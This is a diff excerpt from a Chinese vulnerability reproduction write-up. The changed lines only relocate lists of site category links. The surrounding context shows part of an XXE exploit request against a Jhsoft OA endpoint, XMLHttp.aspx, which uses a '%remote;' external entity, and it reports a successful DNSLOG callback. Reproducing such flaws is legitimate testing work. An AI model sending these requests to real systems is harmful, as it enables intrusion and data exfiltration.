@@ -35,14 +35,6 @@ protected void Page_Load(object sender, EventArgs e)
 
 # 漏洞复现
 
-深入探索
-
-计算机安全
-
-数据管理
-
-搜索引擎优化与营销
-
 ```
 POST /c6/Jhsoft.Web.dossier/XMLHttp.aspx/ HTTP/1.1
 Host: jhsoft.mrxn.net
@@ -53,6 +45,14 @@ Host: jhsoft.mrxn.net
 %remote;]>
 <root/>
 ```
+
+深入探索
+
+防病毒程序与恶意软件
+
+数据管理
+
+计算机服务器
 
 在DNSLOG平台成功收到请求
 
